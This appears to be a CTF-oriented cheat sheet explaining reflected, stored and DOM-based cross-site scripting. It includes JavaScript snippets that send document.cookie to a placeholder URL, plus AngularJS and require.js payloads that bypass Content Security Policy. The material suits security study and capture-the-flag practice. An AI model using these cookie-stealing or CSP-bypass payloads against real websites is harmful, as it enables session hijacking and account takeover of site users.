# 💬 XSS

Cross Site Scripting (XSS) is a type of attack in which malicious scripts are injected in a website and executed on the client browser.

To demonstrate the presence of a XSS vulnerability it is enough to execute `<script>alert('Hi!')</script>`

Goals of a XSS:

- Steal the user cookie
- Log user activities on the website
- Change client code execution
- Make action from the admin account

## Types of XSS

There are three main types of XSS:

- reflected:
- stored:
- DOM-based

### Reflected

In reflected XSS the data inserted by the user is included in the webpage source without any validation.

Common point of attacks are query or path params.

```
http://website.com/profile?greetings=<script>alert('Hi!')</script>
```

### Stored

In stored XSS the payload is stored on the server and it is executed when other users visit the page.

It was very common in the past inside public forum or blogs. The payload can be stored inside a comment or a post.

Other examples are user profile information or contact forms.

Do you know someone called `<script>alert('Hi!')</script>`?

When there is no way to test your payload, this type of vulnerability becomes a blind XSS. This could happen for example with the restricted account.

### DOM-based

In DOM-based XSS the execution happens in the browser without any refreshes or updates.

Common examples are input form or special page actions.

## Send requests in Javascript

XSS challenges usually require to do a request with a secret value.
These snippets below are possible ways to do it.

```js
// this is a redirection, but it could be used too
document.location = '<url>?cookie=' + document.cookie
```

```js
var request = new XMLHttpRequest()
request.open('GET', '<url>?cookie=' + document.cookie)
request.send(null)
```

```js
fetch('<url>?cookie=' + document.cookie)
```

## CSP bypasses

### JSONP endpoints

This technique is based on special JSONP endpoints that allows unsafe execution of malicious scripts.

Look [here](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) for a list of the most common endpoints.

:::caution
If there are any CSP sources set, you should pay attention on which endpoint you are using.
:::

```html
<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

### require.js

If the website uses require.js, it is possible to load additional code that will be automatically injected.
This means that the code will be loaded together with require.js and so it will avoid any nonce or other CSP.

```js
<script data-main="data:1,alert(1)" src="require.js"></script>
```
